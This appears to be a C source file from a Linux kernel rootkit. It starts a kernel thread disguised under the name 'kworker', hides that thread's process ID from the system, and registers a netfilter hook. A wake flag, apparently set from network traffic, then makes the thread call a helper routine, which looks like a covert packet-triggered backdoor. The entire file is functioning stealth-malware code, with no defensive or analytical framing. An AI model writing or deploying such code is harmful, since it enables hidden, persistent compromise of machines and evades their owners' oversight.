#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/kthread.h>

/* include */
#include "type.h"
#include "debug.h"

/* logic */
#include "cmd.h"
#include "hide.h"

/* net */
#include "nf_hook.h"
#include "watcher.h"
#include "m_helper.h"

// control var
bool wakeup = false;

// task
static struct task_struct *_task = NULL;

// task pid
static unsigned long _tpid = 0;

//
static int _watcher(void *argv)
{
        while (!kthread_should_stop()) {
                set_current_state(TASK_UNINTERRUPTIBLE);
                if (wakeup) {
                        m_helper();
                        DEBUG("shini :: _watcher : called!\n");
                        wakeup = false;
                }
                else
                        schedule_timeout(HZ);
        }
        return 0;
}

void watcher_init(void)
{
        _task = kthread_run(_watcher, NULL, "kworker");

        if (_task == NULL)
                return;

        // init netfilter hook
        nf_hook_init();

        // get task pid
        _tpid = _task->pid;

        // hide kthread
        hide(_tpid, LIST_HPROC);
}

void watcher_clean(void)
{
        // stop kernel thread
        kthread_stop(_task);

        // clean netfilter hook
        nf_hook_clean();

        // unhide
        unhide(_tpid, LIST_HPROC);
}

